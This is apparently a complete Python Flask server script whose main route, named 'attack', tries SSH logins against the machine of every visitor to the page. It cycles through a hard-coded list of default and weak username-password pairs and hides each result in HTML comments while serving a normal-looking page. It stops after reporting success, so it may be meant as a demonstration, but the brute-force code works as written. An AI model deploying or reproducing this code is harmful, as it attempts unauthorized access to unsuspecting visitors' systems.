# -*- coding: utf-8 -*-

from flask import Flask, Response, request
from time import sleep
import paramiko
import sys

app = Flask(__name__)
sys.path.insert(0, "/srv/app")

USERS = [
    ("root", "toor"),
    ("user", "user"),
    ("admin", "admin"),
    ("oracle", "oracle"),
    ("john", "correcthorsebatterystaple"),
    ("test", "1"),
    ("user", "123456")
]

TEMPLATE_START = open("/srv/app/header.html", "rb").read()
TEMPLATE_END = open("/srv/app/footer.html", "rb").read()


@app.route('/')
def attack():
    hostname = request.remote_addr
    port = 22
    
    def generate():
        yield TEMPLATE_START
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for username, password in USERS:
            status = None
            try:
                client.connect(hostname, port, username=username, password=password, timeout=0.5, banner_timeout=0.5, auth_timeout=0.5)
                client.close()
            except Exception as e:
                status = "{}".format(e)
            #except paramiko.ssh_exception.AuthenticationException:
            #    status = "invalid password"
            #except paramiko.ssh_exception.BadAuthenticationType:
            #    status = "server does not support password-based authentication"
            #except Exception as e:
            #    status = "{}".format(e)
            if status:
                yield "<!-- Error occured: {} while connecting to {}@{}:22 -->\n".format(status, username, hostname)
            else:
                yield "<!-- Success connection to {}@{}:22, nothing to run -->\n".format(username, hostname)
        yield TEMPLATE_END
    return Response(generate(), mimetype='text/html')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80)

application = app
